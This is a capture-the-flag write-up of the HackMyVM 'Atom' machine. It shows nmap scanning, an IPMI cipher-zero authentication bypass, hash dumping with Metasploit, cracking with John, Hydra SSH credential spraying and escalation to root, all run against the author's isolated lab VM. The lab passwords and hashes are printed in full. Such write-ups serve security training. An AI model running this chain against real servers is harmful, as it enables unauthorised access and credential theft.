---
layout: post
title: Write-Up HMV Atom
date: 2024-09-07 12:50 +0200
tags:
- post
- proxmox
- VM
- HackMyVM
- Write-up
- nmap
- IPMI
categories: 
- Write-up 
- OffSec
author: strambb
pin: false
media_subpath: "/assets/images/"
---
<iframe src="https://hackmyvm.eu/machines/vmcard.php?vm=Atom" frameborder="0" width="600" height="600"></iframe>


# Introduction
In this write-up I will show how to obtain root access in the Atom VM by [cromiphi](https://hackmyvm.eu/profile/?user=cromiphi)

The VM was setup in my isolated network on Proxmox. If you  want to do it the same way, you can find my guide here: [Setup Virtual Box in Proxmox]({% post_url 2024-08-20-setting-up-virtual-boxes-on-proxmox %})

Basics:
- IP 
  - 10.10.99.13

# First Enumeration with Nmap
As always lets enumerate the VM to see what ports are open, which OS is used and which services are active:


```bash
sudo nmap -sV -A -T4 -Pn -p- -oN atom_scan_fast.txt -vv 10.10.99.13
```


Well, the results are quite uninteresting: Despite ssh, no active service...
And most probably ssh will not be the main entry point.
The unspecified Nmap scan is a TCP scan and normally does not scan UDP. Let's see if there is something to find with UDP.

```bash
# Using the -sU flag to initiate a UDP scan
# Also limiting to top 100 ports as UDP scans take a lot longer

sudo nmap -sV -sU -T4 -Pn -top-port 1000 -oN atom_scan_fast_UDP.txt -vv 10.10.99.13

```

The results are:

```bash
──(c0xwl㉿kali)-[~/Downloads]
└─$ sudo nmap -sU -T4 -Pn -top-port 100 -oN atom_scan_fast_UDP.txt -vv 10.10.99.13 

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 10:46 EDT
Initiating Parallel DNS resolution of 1 host. at 10:46
Completed Parallel DNS resolution of 1 host. at 10:46, 0.00s elapsed
Initiating UDP Scan at 10:46
Scanning atom.cyber.range (10.10.99.13) [100 ports]
Increasing send delay for 10.10.99.13 from 0 to 50 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.99.13 from 50 to 100 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.10.99.13 from 100 to 200 due to 11 out of 12 dropped probes since last increase.
Stats: 0:00:33 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 91.86% done; ETC: 10:46 (0:00:03 remaining)
Increasing send delay for 10.10.99.13 from 200 to 400 due to 11 out of 11 dropped probes since last increase.
Discovered open port 623/udp on 10.10.99.13
Stats: 0:00:44 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 99.99% done; ETC: 10:47 (0:00:00 remaining)
Increasing send delay for 10.10.99.13 from 400 to 800 due to 11 out of 12 dropped probes since last increase.
Completed UDP Scan at 10:47, 52.45s elapsed (100 total ports)
Nmap scan report for atom.cyber.range (10.10.99.13)
Host is up, received user-set (0.00082s latency).
Scanned at 2024-09-07 10:46:18 EDT for 53s

PORT      STATE         SERVICE         REASON
7/udp     open|filtered echo            no-response
9/udp     closed        discard         port-unreach ttl 63
17/udp    closed        qotd            port-unreach ttl 63
19/udp    closed        chargen         port-unreach ttl 63
49/udp    closed        tacacs          port-unreach ttl 63
53/udp    closed        domain          port-unreach ttl 63
67/udp    open|filtered dhcps           no-response
68/udp    open|filtered dhcpc           no-response
69/udp    open|filtered tftp            no-response
80/udp    closed        http            port-unreach ttl 63
88/udp    closed        kerberos-sec    port-unreach ttl 63
111/udp   open|filtered rpcbind         no-response
120/udp   closed        cfdptkt         port-unreach ttl 63
123/udp   open|filtered ntp             no-response
135/udp   open|filtered msrpc           no-response
136/udp   closed        profile         port-unreach ttl 63
137/udp   closed        netbios-ns      port-unreach ttl 63
138/udp   closed        netbios-dgm     port-unreach ttl 63
139/udp   open|filtered netbios-ssn     no-response
158/udp   closed        pcmail-srv      port-unreach ttl 63
161/udp   open|filtered snmp            no-response
162/udp   open|filtered snmptrap        no-response
177/udp   closed        xdmcp           port-unreach ttl 63
427/udp   closed        svrloc          port-unreach ttl 63
443/udp   open|filtered https           no-response
445/udp   open|filtered microsoft-ds    no-response
497/udp   closed        retrospect      port-unreach ttl 63
500/udp   closed        isakmp          port-unreach ttl 63
514/udp   open|filtered syslog          no-response
515/udp   closed        printer         port-unreach ttl 63
518/udp   closed        ntalk           port-unreach ttl 63
520/udp   closed        route           port-unreach ttl 63
593/udp   open|filtered http-rpc-epmap  no-response
#################### Here is an open port #################
623/udp   open          asf-rmcp        udp-response ttl 62
###########################################################
626/udp   open|filtered serialnumberd   no-response
631/udp   closed        ipp             port-unreach ttl 63
996/udp   closed        vsinet          port-unreach ttl 63
997/udp   open|filtered maitrd          no-response
998/udp   closed        puparp          port-unreach ttl 63
999/udp   closed        applix          port-unreach ttl 63
1022/udp  open|filtered exp2            no-response
1023/udp  closed        unknown         port-unreach ttl 63
1025/udp  closed        blackjack       port-unreach ttl 63
1026/udp  closed        win-rpc         port-unreach ttl 63
1027/udp  open|filtered unknown         no-response
1028/udp  closed        ms-lsa          port-unreach ttl 63
1029/udp  closed        solid-mux       port-unreach ttl 63
1030/udp  open|filtered iad1            no-response
1433/udp  closed        ms-sql-s        port-unreach ttl 63
1434/udp  closed        ms-sql-m        port-unreach ttl 63
1645/udp  open|filtered radius          no-response
1646/udp  closed        radacct         port-unreach ttl 63
1701/udp  closed        L2TP            port-unreach ttl 63
1718/udp  open|filtered h225gatedisc    no-response
1719/udp  open|filtered h323gatestat    no-response
1812/udp  closed        radius          port-unreach ttl 63
1813/udp  open|filtered radacct         no-response
1900/udp  open|filtered upnp            no-response
2000/udp  closed        cisco-sccp      port-unreach ttl 63
2048/udp  open|filtered dls-monitor     no-response
2049/udp  closed        nfs             port-unreach ttl 63
2222/udp  closed        msantipiracy    port-unreach ttl 63
2223/udp  open|filtered rockwell-csp2   no-response
3283/udp  closed        netassistant    port-unreach ttl 63
3456/udp  open|filtered IISrpc-or-vat   no-response
3703/udp  closed        adobeserver-3   port-unreach ttl 63
4444/udp  open|filtered krb524          no-response
4500/udp  open|filtered nat-t-ike       no-response
5000/udp  closed        upnp            port-unreach ttl 63
5060/udp  closed        sip             port-unreach ttl 63
5353/udp  closed        zeroconf        port-unreach ttl 63
5632/udp  closed        pcanywherestat  port-unreach ttl 63
9200/udp  closed        wap-wsp         port-unreach ttl 63
10000/udp open|filtered ndmp            no-response
17185/udp closed        wdbrpc          port-unreach ttl 63
20031/udp closed        bakbonenetvault port-unreach ttl 63
30718/udp open|filtered unknown         no-response
31337/udp closed        BackOrifice     port-unreach ttl 63
32768/udp closed        omad            port-unreach ttl 63
32769/udp closed        filenet-rpc     port-unreach ttl 63
32771/udp closed        sometimes-rpc6  port-unreach ttl 63
32815/udp open|filtered unknown         no-response
33281/udp closed        unknown         port-unreach ttl 63
49152/udp closed        unknown         port-unreach ttl 63
49153/udp open|filtered unknown         no-response
49154/udp closed        unknown         port-unreach ttl 63
49156/udp open|filtered unknown         no-response
49181/udp open|filtered unknown         no-response
49182/udp open|filtered unknown         no-response
49185/udp open|filtered unknown         no-response
49186/udp closed        unknown         port-unreach ttl 63
49188/udp closed        unknown         port-unreach ttl 63
49190/udp closed        unknown         port-unreach ttl 63
49191/udp open|filtered unknown         no-response
49192/udp open|filtered unknown         no-response
49193/udp open|filtered unknown         no-response
49194/udp open|filtered unknown         no-response
49200/udp closed        unknown         port-unreach ttl 63
49201/udp open|filtered unknown         no-response
65024/udp closed        unknown         port-unreach ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 52.55 seconds
           Raw packets sent: 609 (37.116KB) | Rcvd: 60 (4.896KB)

```

# IPMI service

The UDP scan reveals one open port in the top 100 which is `623`
Searching for the service running on 623 reveals IPMI, the 
"Intelligent Platform Management Interface" which is used for so-called "Lights-out" Management of servers. 

More information can be found here: [IPMI](https://en.wikipedia.org/wiki/Intelligent_Platform_Management_Interface)


Using the world wide web to determine how to exploit IPMI leads us to [IPMI on Hacktricks.xyz](https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi) with provides the following suggenstions for exploitation:

- IPMI Authentication Bypass via Cipher 0
  - allows to login with any password given a valid user
- IPMI 2.0 RAKP Authentication Remote Password Hash retrieval
  - retrieval of salted hashes (MD5 and SHA1) of valid users
- IPMI Anonymous Authentication
  - Login w/o blank credentials

Additionally, there a several Manufacturare specific exploits available


# Exploitation of IPMI

Starting with the first one, let see if the target is vulnerable. To do so, we could use metasploit with

```bash
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
or simply trying to login with a valid user using [ipmitool](https://www.debiantutorials.com/installing-and-using-the-ipmi-tool/)

```bash

# with a valid user name, admin might be a good guess.

$ ipmitool -I lanplus -C 0 -H 10.10.99.13 -U admin -P NotTheRealPassword user list 
ID  Name             Callin  Link Auth  IPMI Msg   Channel Priv Limit
1                    true    false      false      Unknown (0x00)
2   admin            true    false      true       ADMINISTRATOR
3   analiese         true    false      true       USER
4   briella          true    false      true       USER
5   richardson       true    false      true       USER
6   carsten          true    false      true       USER
7   sibylle          true    false      true       USER
8   wai-ching        true    false      true       USER
9   jerrilee         true    false      true       USER
10  glynn            true    false      true       USER
11  asia             true    false      true       USER
12  zaylen           true    false      true       USER
13  fabien           true    false      true       USER
14  merola           true    false      true       USER
15  jem              true    false      true       USER
16  riyaz            true    false      true       USER
17  laten            true    false      true       USER
18  cati             true    false      true       USER
19  rozalia          true    false      true       USER
20  palmer           true    false      true       USER
21  onida            true    false      true       USER
22  terra            true    false      true       USER
23  ranga            true    false      true       USER
24  harrie           true    false      true       USER
25  pauly            true    false      true       USER
26  els              true    false      true       USER
27  bqb              true    false      true       USER
28  karlotte         true    false      true       USER
29  zali             true    false      true       USER
30  ende             true    false      true       USER
31  stacey           true    false      true       USER
32  shirin           true    false      true       USER
33  kaki             true    false      true       USER
34  saman            true    false      true       USER
35  kalie            true    false      true       USER
36  deshawn          true    false      true       USER
37  mayeul           true    false      true       USER
38  backdoor         true    false      false      ADMINISTRATOR
39                   true    false      false      Unknown (0x00)
40                   true    false      false      Unknown (0x00)
41                   true    false      false      Unknown (0x00)
42                   true    false      false      Unknown (0x00)
43                   true    false      false      Unknown (0x00)
44                   true    false      false      Unknown (0x00)
45                   true    false      false      Unknown (0x00)
46                   true    false      false      Unknown (0x00)
47                   true    false      false      Unknown (0x00)
48                   true    false      false      Unknown (0x00)
49                   true    false      false      Unknown (0x00)
50                   true    false      false      Unknown (0x00)
51                   true    false      false      Unknown (0x00)
52                   true    false      false      Unknown (0x00)
53                   true    false      false      Unknown (0x00)
54                   true    false      false      Unknown (0x00)
55                   true    false      false      Unknown (0x00)
56                   true    false      false      Unknown (0x00)
57                   true    false      false      Unknown (0x00)
58                   true    false      false      Unknown (0x00)
59                   true    false      false      Unknown (0x00)
60                   true    false      false      Unknown (0x00)
61                   true    false      false      Unknown (0x00)
62                   true    false      false      Unknown (0x00)
63                   true    false      false      Unknown (0x00)


```

The output provides us with a hole list of users configured on the target. All those users might be available on ssh. 

The second flaw in IPMI allows to retrieve the salted hashes of these users which can be cracked later using John. 
To do so, we first need a clean list of usernames which can be retrieved using ipmitool and altered with grep

First the usernames:

```bash
ipmitool -I lanplus -C 0 -H 10.10.99.13 -U admin -P NotTheRealPassword user list > usernames.txt
```

Then cleaning up to build a username list which can later be used in the dumphashes scanner of metasploit

```bash
# Goal is a clean list of users, one username per line
# print the username.txt content, grep each line beginnign with a number, cutting it  and taking the third and fouth column, remove starting and trailing whitespaces, keeping what it not empty

cat usernames.txt | grep '^[0-9]' | cut -d ' ' -f 3,4 | awk '{$1=$1};1' | grep -v '^$' > usernames_clean.txt
```

Retrieving user hashes via IPMI using the metasploit scanner:

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting                            Required  Description
   ----                  ---------------                            --------  -----------
   CRACK_COMMON          true                                       yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                              no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                 no        Save captured password hashes in john the ripper format
   PASS_FILE             /usr/share/metasploit-framework/data/word  yes       File containing common passwords for offline cracking, one per line
                         lists/ipmi_passwords.txt
   RHOSTS                                                           yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
                                                                              asics/using-metasploit.html
   RPORT                 623                                        yes       The target port
   SESSION_MAX_ATTEMPTS  5                                          yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                                          yes       Delay between session retries in seconds
   THREADS               1                                          yes       The number of concurrent threads (max one per host)
   USER_FILE             /usr/share/metasploit-framework/data/word  yes       File containing usernames, one per line
                         lists/ipmi_users.txt


View the full module info with the info, or info -d command.

# Using the clean username list as input
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set user_file usernames_clean.txt
user_file => usernames_clean.txt

# Setting the hashfile for later cracking
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set output_john_file hashes
output_john_file => hashes

# Setting the target
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.10.99.13
rhosts => 10.10.99.13

# and go
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.10.99.13:623 - IPMI - Hash found: admin:70df6eaf020300001255f8ebe4facf1e7dc9980dda14c8f11726f5db24a35ce33dd4aee85c5f74fba123456789abcdefa123456789abcdef140561646d696e:bfd8c9e2d40a7f249b833b57561a84184f6fcd2d
[+] 10.10.99.13:623 - IPMI - Hash for user 'admin' matches password 'cukorborso'
[+] 10.10.99.13:623 - IPMI - Hash found: analiese:4c0e8ae38403000072a00df6a1bd057e38543132636ae141ea3459154e62000d36f1c044bac1da16a123456789abcdefa123456789abcdef1408616e616c69657365:bb44a679bdb1be57d5f5cab6b9ebfa3a74fc7689
[+] 10.10.99.13:623 - IPMI - Hash found: briella:905fea3206040000d03bef8484aef3a3fdbc12be39cf66cc368164cc172551b112d74c192cd22a8ca123456789abcdefa123456789abcdef1407627269656c6c61:ba257f254d04463c3517bea4ef0fb66ae23805ab
[+] 10.10.99.13:623 - IPMI - Hash found: richardson:8ab73de7880400006abf61d46e840b136df7229249a9ad75c84b843640eea042632e737d23857b09a123456789abcdefa123456789abcdef140a72696368617264736f6e:8bd81095ba887192d4583357c003705f86826efa
[+] 10.10.99.13:623 - IPMI - Hash found: carsten:397886eb0a050000a892a2c078d6497a7544a492475eebad849141c6446e9a782afa3aaeb93f9016a123456789abcdefa123456789abcdef14076361727374656e:8b848ab1d69466d35a2fc585cd94f12fe1b8af10
[+] 10.10.99.13:623 - IPMI - Hash found: sibylle:826e87ce8c0500007bbc6e7f1cc3271d819792660cf23f392ab73d848aee0f095f37b61c2339bacea123456789abcdefa123456789abcdef1407736962796c6c65:3ff0394fa3beb5bee65837e72777ad3ee9d9dcdc
[+] 10.10.99.13:623 - IPMI - Hash found: wai-ching:2a797fff0e06000025567596f3280b4274661f8f1c025fa1f0e7b6056d9afcca04084c0f14d89136a123456789abcdefa123456789abcdef14097761692d6368696e67:98473e4776834c26a6c0b5646f9db0d60f659833
[+] 10.10.99.13:623 - IPMI - Hash found: jerrilee:d4ac802890060000bc1c172472cd426be9dd67604c859514a82b787e2f78612572250e870291433ba123456789abcdefa123456789abcdef14086a657272696c6565:253bc598733be6179b413c8631dfde516193a1e0
[+] 10.10.99.13:623 - IPMI - Hash found: glynn:e0d9af8c12070000834e34b7e22785b1e63730a40040711ebe366b997d7889aa7aacb4d1a4e64f5ca123456789abcdefa123456789abcdef1405676c796e6e:2e46cdd295836140a15984b18bfbe6b5b23db529
[+] 10.10.99.13:623 - IPMI - Hash found: asia:b087d81d94070000c653ed941b8f5949b60ed13e7f0c2911ad624c186aceacc2b42d621f38ea83a3a123456789abcdefa123456789abcdef140461736961:f928669756f5b4d5e67f197eaba883420a86f3d8
[+] 10.10.99.13:623 - IPMI - Hash found: zaylen:89aa54151608000080cde49c65d594005fc2aa8ee892767584c48a154e648e1c13f460a21f538ecaa123456789abcdefa123456789abcdef14067a61796c656e:c3716f0c2d22a0e1474608f6a76be2b606e5675f
[+] 10.10.99.13:623 - IPMI - Hash found: fabien:6f3db5b898080000ecd5761b960b4eb8f19ce3a4355a5fbdf2734c45ec1afcb767eec83f39023dfba123456789abcdefa123456789abcdef140666616269656e:eb2af857dec42f32995e4ee97423fb1d7b539f91
[+] 10.10.99.13:623 - IPMI - Hash found: merola:67b646141a09000004d5cc572497f0de606dc903759ae3f1f07b3768b1cb6a7b29177cd045cc5a5aa123456789abcdefa123456789abcdef14066d65726f6c61:374f11544158d04e50a0dd502532a2c6b510a140
[+] 10.10.99.13:623 - IPMI - Hash found: jem:2d0f7e6d9c090000619fca1df13004a8e5509cdd048a2773e27ff59ed0a6c49928c4e651c2639c81a123456789abcdefa123456789abcdef14036a656d:121fa4452cf58fefc76a09b3a13b0a6d79a7929e
[+] 10.10.99.13:623 - IPMI - Hash found: riyaz:8fc0ded71e0a00004fd4633687529479caf34a5aaa63e5fd2b5bfa8eb4a8a89885cb595a13739c55a123456789abcdefa123456789abcdef1405726979617a:b8a13670908a52d6c0c5b942232598c82b4b0bbc
[+] 10.10.99.13:623 - IPMI - Hash found: laten:a34d1f66a00a00005b06e3b2315fa3aa68ab49857e71e2a7ca9c04c1b593b9d5bb25f0fff5bcf77ca123456789abcdefa123456789abcdef14056c6174656e:fdb6141fd352902932d23e26c5d134653a300c36
[+] 10.10.99.13:623 - IPMI - Hash found: cati:edaf1b72220b00005872bb74b192b620540514897916f89ac172944578a4965774a16e2efdaad0e6a123456789abcdefa123456789abcdef140463617469:70e2df61a0bdc9c12da2e8a8fcdde70e00eabff2
[+] 10.10.99.13:623 - IPMI - Hash found: rozalia:5fcadcfaa40b00005506411411e74eca67be8c73a2d12e89a5e9faeeeff71d8fa61e45715df9374ca123456789abcdefa123456789abcdef1407726f7a616c6961:305e5fb32dbde6e3bd722036b8886d88b8de5964
[+] 10.10.99.13:623 - IPMI - Hash found: palmer:e02125da260c0000e0e9dee3720688af235336cad01ecd36db0c5f14e205371ff87018587d5bf307a123456789abcdefa123456789abcdef140670616c6d6572:aeaead32789400020ceaaa231544afd63dcbf3de
[+] 10.10.99.13:623 - IPMI - Hash found: onida:a7e1ddd9a80c0000c75f7357e6e8b2509d8e53025765a70138ca6f5b87832daedaea8752541a0689a123456789abcdefa123456789abcdef14056f6e696461:f34e82f039b56d5b6a1e01a6fab143ba245c3339
[+] 10.10.99.13:623 - IPMI - Hash found: terra:8d5a35262a0d00007425788738ed00abbb8c2d43ddd99bbaa2e65704e6616a6a3e07e4d36a794f15a123456789abcdefa123456789abcdef14057465727261:57e3e99e7032c59e8b48ae5405a0d9cbb8cefe59
[+] 10.10.99.13:623 - IPMI - Hash found: ranga:bf917201ac0d0000a1f129cee3f4650818223a09d0c9472a3676dfb1dc9fa6e918a3cc9ea41b147da123456789abcdefa123456789abcdef140572616e6761:4282665a44facd0bc716315d1914d578b7633824
[+] 10.10.99.13:623 - IPMI - Hash found: harrie:09d0dcc92e0e000062682af4bc167b87e070cd2ef910d4a799dd426330295e858e2b1857983282a5a123456789abcdefa123456789abcdef1406686172726965:6f36a926c2d1e75bcc0d965e3f9d4ef1154eb84a
[+] 10.10.99.13:623 - IPMI - Hash found: pauly:ff7088e0b00e00007a216d03356594777898a95468ba6959b22b856f9fae4a9e34c4e57cabb10926a123456789abcdefa123456789abcdef14057061756c79:216937b57a3235478202fc37c37a96e35d1d8c43
[+] 10.10.99.13:623 - IPMI - Hash found: els:01d9f96c320f0000365a21c5f0497002f4bd6ba2fd787f18217a02de9899bdd76f4dc68e64b703bca123456789abcdefa123456789abcdef1403656c73:5d8d58d21daf2b10204789e281645033a67bb2cc
[+] 10.10.99.13:623 - IPMI - Hash found: bqb:1d52ad88b40f0000200419b7a0edabfa744022e3d13f7b94a8ffe433925a34f6a2dbb899687f497ea123456789abcdefa123456789abcdef1403627162:64137ee230e82c530e5d65bab5673cf761ffe24e
[+] 10.10.99.13:623 - IPMI - Hash found: karlotte:2339dcdb36100000602b1a8e86d3b7dd72546f5c70e6aa9eee92309602102b98f629f94669d7911ea123456789abcdefa123456789abcdef14086b61726c6f747465:bfb4565083664597ba86baa315f6625cd3254e0e
[+] 10.10.99.13:623 - IPMI - Hash found: zali:4350122ab810000020024a108d756f3513cbb9b9a7e28a1dce6606cabc2f4126b434b07778ee4612a123456789abcdefa123456789abcdef14047a616c69:2ce61a02d09d327dcded8abc9db16d71b4bd6a57
[+] 10.10.99.13:623 - IPMI - Hash found: ende:732f14793a110000ab6249f029179ce997b4b4600aa5d2f3b25a698bcb28d414b2064c8a56b6e3caa123456789abcdefa123456789abcdef1404656e6465:449a3a60452603dd0adbd9ceb14ad27199c0b47e
[+] 10.10.99.13:623 - IPMI - Hash found: stacey:a2911195bc110000ac667a60a76555531517fd390ea75dcb34ca3278d9b752fbf8c5ea2e5364984aa123456789abcdefa123456789abcdef1406737461636579:a3beda81835c2affc85c2bc8b3864a96c326cdcf
[+] 10.10.99.13:623 - IPMI - Hash found: shirin:8a0f16e93e12000090e99ed97d0c8a4cd16a41f5ffb1b8f0739be76c0306b9386ee34863e77661f9a123456789abcdefa123456789abcdef140673686972696e:f0497fe5fa42e6f408d6a57c6761e2df8e9bb8b9
[+] 10.10.99.13:623 - IPMI - Hash found: kaki:70f75abdc01200006afb29a62e7826b4b1984792ec9ba05e31ac113f71a75fb4a41c2d55fd947264a123456789abcdefa123456789abcdef14046b616b69:eba29275b75c972b714a25dae174f46032f77fc2
[+] 10.10.99.13:623 - IPMI - Hash found: saman:66c06cf9421300004e6f66807467560e3be8531b039836337914640b7df90093030d1a151c4033afa123456789abcdefa123456789abcdef140573616d616e:8063b495506902373b9f2b1e634192fdd9d001a5
[+] 10.10.99.13:623 - IPMI - Hash found: kalie:a3fe46cbc41300008b6443a6d5e94b0214e04718477671e4d4549ae44524c8f09b02f4b553c90fbaa123456789abcdefa123456789abcdef14056b616c6965:3ce50546685a02d105241a151b733314513a06d2
[+] 10.10.99.13:623 - IPMI - Hash found: deshawn:b48b218c46140000689fd681dc34d83aacd10fcec9d00f36c84c88aa9ab04df5d72eb3f2b1630cf2a123456789abcdefa123456789abcdef14076465736861776e:ecba90b04b02015c1a7d9730be2bf833f7e59463
[+] 10.10.99.13:623 - IPMI - Hash found: mayeul:05a02fcac8140000b71961e77e2d1002a7873302f422d75ff2d500d83edb7aba473403358b42da5ba123456789abcdefa123456789abcdef14066d617965756c:22fb8dc38a058bfc1fcb504d8ad16ad0e4c03c89
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

We found an easy one directly with "admin" and "cukorborso" but ssh into it doesn't work...

# Hash Cracking

Let's crack the hashes then:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes

Using default input encoding: UTF-8
Loaded 36 password hashes with 36 different salts (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 128/128 SSE2 4x])
Will run 12 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
jaffa1           (10.10.99.13 ranga)     
mackenzie2       (10.10.99.13 merola)     
120691           (10.10.99.13 zaylen)     
TWEETY1          (10.10.99.13 asia)     
sexymoma         (10.10.99.13 terra)     
number17         (10.10.99.13 jerrilee)     
poynter          (10.10.99.13 zali)     
jesus06          (10.10.99.13 briella)     
trick1           (10.10.99.13 laten)     
dezzy            (10.10.99.13 els)     
081704           (10.10.99.13 jem)     
122987           (10.10.99.13 cati)     
tripod           (10.10.99.13 ende)     
290992           (10.10.99.13 bqb)     
milo123          (10.10.99.13 deshawn)     
evan             (10.10.99.13 glynn)     
castillo1        (10.10.99.13 stacey)     
chatroom         (10.10.99.13 fabien)     
numberone        (10.10.99.13 kaki)     
071590           (10.10.99.13 harrie)     
241107           (10.10.99.13 mayeul)     
billandben       (10.10.99.13 kalie)     
me4life          (10.10.99.13 sibylle)     
djones           (10.10.99.13 riyaz)     
jiggaman         (10.10.99.13 onida)     
phones           (10.10.99.13 palmer)     
emeralds         (10.10.99.13 karlotte)     
515253           (10.10.99.13 pauly)     
honda            (10.10.99.13 analiese)     
darell           (10.10.99.13 richardson)     
kittyboo         (10.10.99.13 shirin)     
2468             (10.10.99.13 carsten)     
090506           (10.10.99.13 saman)     
batman!          (10.10.99.13 rozalia)     
10101979         (10.10.99.13 wai-ching)     
cukorborso       (10.10.99.13 admin)     
36g 0:00:00:02 DONE (2024-09-08 10:25) 16.66g/s 4187Kp/s 7372Kc/s 7372KC/s d7054677l..clecle2
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Alright, all cracked. Let's see if a password is reused for one of the users using ssh.
First we need to create a "username:password" formatted list.

```bash
john --show hashes | grep '10.10.' | cut -d ' ' -f 2 > creds_atom.txt
```

# Bruteforcing SSH with Logins and Passwords


Now let's use Hydra to bruteforce the ssh login

```bash
hydra -C creds_atom.txt ssh://10.10.99.13
   
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-08 10:38:27
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries, ~3 tries per task
[DATA] attacking ssh://10.10.99.13:22/
[22][ssh] host: 10.10.99.13   login: onida   password: jiggaman
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-08 10:38:37
```

Password-reuse is not recommended... Let's see what onida is up to


# Initial Foothold

```bash

$ ssh-copy-id onida@10.10.99.13
/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: "/home/c0xwl/.ssh/id_ed25519.pub"
/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed
/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys
onida@10.10.99.13's password: 

Number of key(s) added: 1

Now try logging into the machine, with:   "ssh 'onida@10.10.99.13'"
and check to make sure that only the key(s) you wanted were added.

                                                                                                                                                           

$ ssh onida@10.10.99.13 
Linux atom 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
```


An we are in as onida. The user flag can be found directly in the user's home directory

```bash
onida@atom:~$ 

```

Now, let's escalate. let's see if we can sudo.


```bash
onida@atom:~$ sudo -l
-bash: sudo: command not found
```

# Finding Another Hash


Mhmm ok, before trying to find SUID, SGID or other path to escalation, let's see if we can find something interesting.
We can find some db file in `/var/www/html/` which looks like a user database incl. some hash. 

```bash
onida@atom:~$ cd /var/www/html/
onida@atom:/var/www/html$ cat atom-2400-database.db 
Q�Y�&��mtableusersusersCREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL
))=indexsqlite_autoindex_users_1user�$))�tablelogin_attemptslogin_attemptsCREATE TABLE login_attempts (
    id INTEGER PRIMARY KEY,
    ip_address TEXT NOT NULL,
    attempt_time INTEGER NOT NULL
��nKE�atom$2y$10$Z1K.4yVakZEY.Qsju3WZzukW/M3fI6BkSohYOiBQqG7pK1F2fH9Cm
���     atom

▒▒
        onida@atom:/var/www/html$ 

```

We can copy the hash and try to crack it with JohnTheRipper on the attack box.

```bash
$ echo '$2y$10$Z1K.4yVakZEY.Qsju3WZzukW/M3fI6BkSohYOiBQqG7pK1F2fH9Cm' > hash2

§ john --wordlist=/usr/share/wordlists/rockyou.txt

$ john --show hash2                                     
?:madison

1 password hash cracked, 0 left
```

# Vertical Escalation to Root

Nice, we found the the password of user atom. Let's try to su into root using the password

```bash
onida@atom:/var/www/html$ su root
Password: 
root@atom:/var/www/html# whoami
root
root@atom:/var/www/html# cd /root
root@atom:~# ls
root.txt
root@atom:~# cat root.txt 
[Spoiler]
root@atom:~# 
```

Alright, switching user works and the flag was in /root. 


We are done!

# END